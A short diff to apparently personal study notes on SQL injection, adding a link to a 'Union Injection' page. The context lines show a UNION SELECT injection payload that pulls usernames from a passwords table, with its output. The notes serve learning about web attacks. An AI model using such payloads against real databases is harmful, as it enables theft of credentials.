@@ -66,3 +66,5 @@ This query would return:
 `mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- ' +-----------+-----------+-----------+-----------+ | product_1 | product_2 | product_3 | product_4 | +-----------+-----------+-----------+-----------+ |   admin   |    2      |    3      |    4      | +-----------+-----------+-----------+-----------+`
 
 As we can see, our wanted output of the '`UNION SELECT username from passwords`' query is found at the first column of the second row, while the numbers filled the remaining columns.
+
+Next:[[Union Injection]]
